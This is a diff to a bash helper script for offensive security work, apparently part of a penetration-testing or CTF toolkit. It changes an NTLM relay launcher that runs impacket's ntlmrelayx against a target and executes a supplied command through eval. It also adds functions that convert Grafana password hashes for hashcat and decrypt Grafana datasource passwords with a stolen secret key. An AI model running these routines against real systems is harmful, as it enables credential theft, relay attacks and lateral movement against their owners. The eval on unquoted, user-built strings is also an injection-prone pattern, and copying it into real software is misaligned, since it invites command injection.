@@ -71,14 +71,17 @@ start_ntlmrelay() {
         return 1
     fi
     echo "Starting ntlmrelay on target IP: $target_ip"
-    if [[ -z "$cmd" ]]; then
-        cmd=$(get_powershell_interactive_shell)
+    
+    if [[ ! -z "$cmd" ]]; then
+        ntlmrelay_additional_options="$ntlmrelay_additional_options -c \"$cmd\""
     fi
     if pgrep -f "ntlmrelayx"; then
         echo "ntlmrelay is already running, skipping."
         return 0
     fi
-    sudo python3 /usr/share/doc/python3-impacket/examples/ntlmrelayx.py --no-http-server -smb2support -c "$cmd" | tee -a $trail_log
+    local relay_command="ntlmrelayx.py --no-http-server -smb2support -t $target_ip $ntlmrelay_additional_options"
+    echo $relay_command
+    eval "$relay_command" | tee -a $trail_log
 
 }
 
@@ -149,6 +152,32 @@ remove_openssh_passphrase() {
         return 1
     fi
     ssh-keygen -p -f "$identity" -P $passphrase -N ""
+}
+
+run_grafana2hashcat() {
+    cp $SCRIPTDIR/../python/grafana2hashcat.py .
+    if [[ -z $grafana_hashfile ]]; then
+        echo "Grafana hash file must be set before running grafana2hashcat."
+        return 1
+    fi
+    sed -i 's/|/,/g' $grafana_hashfile
+    python3 grafana2hashcat.py "$grafana_hashfile" -o "$hash_file"
+    hashcat_generic_kdf
+}
+
+run_grafana_decrypt() {
+    cp $SCRIPTDIR/../python/grafana_decrypt.py .
+    if [[ -z $secret_key ]]; then
+        echo "Secret key must be set before running grafana_decrypt."
+        return 1
+    fi
+    if [[ -z $source_password ]]; then
+        echo "Source password must be set before running grafana_decrypt."
+        return 1
+    fi
+    sed -E -i "s/dataSourcePassword = .*/dataSourcePassword = \"$source_password\"/g" grafana_decrypt.py
+    sed -E -i "s/grafanaINI_secretKey = .*/grafanaINI_secretKey = \"$secret_key\"/g" grafana_decrypt.py
+    python3 grafana_decrypt.py 
 }
 
 run_netexec() {
